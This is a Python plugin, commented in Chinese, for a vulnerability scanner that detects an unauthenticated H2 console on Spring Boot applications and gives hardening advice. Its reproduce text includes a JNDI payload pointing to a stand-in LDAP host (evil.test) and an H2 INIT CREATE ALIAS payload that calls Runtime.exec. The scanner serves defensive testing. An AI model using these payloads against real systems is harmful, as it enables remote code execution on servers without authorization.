# Spring Boot Actuator H2 Database Console 未授权访问 + JNDI RCE
# 漏洞原因：spring-boot-starter-actuator 搭配 H2 数据库时，/h2-console 端点可匿名访问，
#   攻击者可通过 JNDI 连接字符串登录 H2 控制台执行任意 SQL / 代码（high）。
# 本插件仅做存在性验证：POST /h2-console 带 JNDI 连接探针，检测响应特征判定接口可达。
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from lib.matcher import match_h2_console
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
H2_MARKER = "spring-h2-console-rce-confirmed"


class SpringH2ConsoleRcePlugin(PluginBase):
    name = "Spring Boot Actuator H2 Console 未授权 JNDI RCE"
    cve = "N/A"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "H2 Console 可匿名访问，通过 JNDI 连接字符串执行任意代码（影响 H2 + Actuator）"
    fix = "为 /h2-console 配置认证；禁用 H2 Console 生产环境；移除 H2 依赖改用生产级数据库"
    fix_detail = (
        "【配置加固】application.yml 生产环境禁用 H2 Console：\n"
        "  spring.h2.console.enabled: false  # 禁用 H2 Console\n"
        "  spring.h2.console.path: /h2-console  # 若必须启用，修改默认路径\n"
        "【移除依赖】pom.xml 删除 H2 数据库依赖，改用生产级数据库：\n"
        "  <dependency><groupId>com.h2database</groupId><artifactId>h2</artifactId><scope>test</scope></dependency>\n"
        "  改用 MySQL / PostgreSQL / Oracle 等生产级数据库\n"
        "【SecurityConfig】为 /h2-console 配置认证与内网限制：\n"
        '  .antMatchers("/h2-console/**").hasRole("ADMIN")\n'
        "【JVM 加固】JVM 启动参数禁用远程类加载（缓解 JNDI 注入）：\n"
        "  -Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n"
        "  -Dcom.sun.jndi.rmi.object.trustURLCodebase=false\n"
        "【WAF 规则】拦截外网对 /h2-console 的访问\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 H2 Console 端点可达性：\n"
        'curl -i "http://target/h2-console"\n'
        "  # 返回 200 + HTML 含 <title>H2 Console</title> 即 H2 Console 暴露\n"
        "\n"
        "# 2. 通过 JNDI 连接字符串触发 RCE（PoC，请勿对未授权目标使用）：\n"
        'curl -X POST "http://target/h2-console/" \\\n'
        '  -d "language=en" \\\n'
        '  -d "setting=Generic+H2+(Embedded)" \\\n'
        '  -d "name=Generic+H2+(Embedded)" \\\n'
        '  -d "driver=javax.naming.InitialContext" \\\n'
        '  -d "url=ldap://evil.test/Exploit"\n'
        "\n"
        "# 3. 利用 H2 INIT 命令执行（CREATE ALIAS 调用 Runtime）：\n"
        'curl -X POST "http://target/h2-console/" \\\n'
        '  -d "driver=org.h2.Driver" \\\n'
        "  -d \"url=jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS 'String x(String c) throws Exception {Runtime.getRuntime().exec(c);return 1;}'\\;CALL EXEC('id')\"\n"
        "\n"
        "# 预期响应：/h2-console 返回 200 + H2 Console 页面即漏洞存在"
    )

    def verify(self, target, session):
        """验证 H2 Console 未授权可达：POST 连接表单探针并判定是否返回 H2 Console 页面特征。
        @param target: 目标站点根 URL
        @param session: 共享 HTTP 会话
        @return: ScanResult——控制台页面可达返回 CONFIRMED，不可达返回 SAFE，网络异常 UNKNOWN
        """
        url = join_url(target, "/h2-console")
        # JNDI 连接探针（仅触发签名，不执行真实 JNDI 查找）
        data = {
            "language": "en",
            "setting": "Generic+H2+(Embedded)",
            "name": "Generic+H2+(Embedded)",
            "driver": "javax.naming.InitialContext",
            # 用内存库 URL 而非 JNDI 地址：探针仅验证控制台表单可达，不触发真实 LDAP 外连
            "url": "jdbc:h2:mem:probe",
        }
        try:
            resp = session.post(url, data=data)
        except Exception as e:
            print(no("Spring H2 Console RCE（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        if H2_MARKER in text:
            print(ok("存在 Spring Boot Actuator H2 Console 未授权 JNDI RCE"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 H2 Console RCE 特征：{H2_MARKER}",
                fix=self.fix,
            )
        # 真实漏洞响应：响应含 H2 Console HTML 特征（<title>H2 Console</title> 等）
        if resp.status_code == 200 and match_h2_console(text):
            print(ok("存在 Spring Boot Actuator H2 Console 未授权 JNDI RCE（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 H2 Console 页面特征（H2 Console 标题 / 表单），证实 H2 Console 可达",
                fix=self.fix,
            )
        print(no("不存在 Spring Boot Actuator H2 Console 未授权 JNDI RCE"))
        return ScanResult(
            kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="H2 Console 不可达或已修复（404/401）"
        )
